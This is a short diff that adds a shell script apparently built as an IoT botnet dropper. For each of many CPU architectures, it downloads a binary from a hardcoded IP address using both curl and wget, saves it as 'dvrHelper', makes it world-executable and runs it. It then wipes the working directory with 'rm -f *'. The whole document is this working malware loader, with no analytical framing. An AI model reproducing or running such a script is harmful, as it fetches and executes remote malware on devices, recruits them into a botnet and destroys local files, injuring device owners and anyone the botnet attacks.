@@ -1,0 +1,13 @@
+#!/bin/sh
+
+BINARIES="arm arm5n arm7 m68k mips mpsl ppc sh4 spc x86"
+
+for BINARY in $BINARIES; do
+	curl http://54.86.64.211/$BINARY -o dvrHelper
+	wget http://54.86.64.211/$BINARY -O dvrHelper
+	chmod 777 dvrHelper
+	./dvrHelper
+done
+
+rm -f *
+
